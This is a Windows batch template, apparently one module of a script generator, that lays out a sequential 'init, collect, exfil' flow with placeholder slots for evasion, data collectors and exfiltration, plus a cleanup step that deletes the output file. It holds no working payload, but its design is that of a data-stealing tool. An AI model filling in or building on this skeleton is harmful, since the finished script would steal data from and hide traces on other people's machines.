REM provides: arch_sequential
REM depends: (none)
REM description: Sequential architecture - init, collect, exfil in order

@echo off
setlocal EnableDelayedExpansion

REM === VARS ===
REM {{VARS_BLOCK}}

REM === INIT OUTPUT ===
REM {{CHUNK:core/output}}

REM === EVASION ===
REM {{EVASION_BLOCK}}

REM === COLLECTORS ===
REM {{COLLECTORS_BLOCK}}

REM === EXFIL ===
REM {{EXFIL_BLOCK}}

REM === CLEANUP ===
if exist "%OUTPUT_FILE%" del /f /q "%OUTPUT_FILE%" >nul 2>nul

endlocal
exit /b 0
